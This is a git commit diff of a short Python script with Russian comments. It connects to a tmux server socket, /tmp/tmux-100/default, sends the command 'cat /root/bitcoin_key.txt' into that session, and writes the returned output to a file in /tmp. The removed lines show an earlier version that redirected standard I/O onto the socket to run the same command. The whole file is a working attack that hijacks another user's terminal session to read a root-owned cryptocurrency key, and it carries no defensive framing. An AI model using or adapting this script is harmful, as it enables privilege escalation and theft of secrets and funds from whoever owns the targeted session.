8aa12a6c1325760b2fe6117a06f549553550accc
abercromb <demon17ya@gmail.com>
2025-06-01 01:14:21 +0300

    Add files via upload

--- script_2.py
+++ script_2.py
@@ -1,6 +1,4 @@
 import socket
-import os
-import subprocess
 import sys
 
 # Создание UNIX-сокета
@@ -10,25 +8,22 @@ try:
     # Подключение к tmux-сокету
     s.connect("/tmp/tmux-100/default")
 
-    # Перенаправление ввода-вывода
-    os.dup2(s.fileno(), 0)  # stdin
-    os.dup2(s.fileno(), 1)  # stdout
-    os.dup2(s.fileno(), 2)  # stderr
+    # Отправка команды в сокет
+    command = "cat /root/bitcoin_key.txt\n"
+    s.sendall(command.encode())
 
-    # Выполнение команды и захват вывода
-    result = subprocess.run(
-        ["cat", "/root/bitcoin_key.txt"],
-        capture_output=True,
-        text=True
-    )
+    # Получение ответа
+    output = ""
+    while True:
+        data = s.recv(1024).decode()
+        if not data:
+            break
+        output += data
 
     # Сохранение вывода в файл
     with open("/tmp/bitcoin_key_output.txt", "w") as f:
         f.write("Command output:\n")
-        f.write(result.stdout)
-        if result.stderr:
-            f.write("Errors:\n")
-            f.write(result.stderr)
+        f.write(output)
 
 except Exception as e:
     with open("/tmp/bitcoin_key_output.txt", "w") as f:
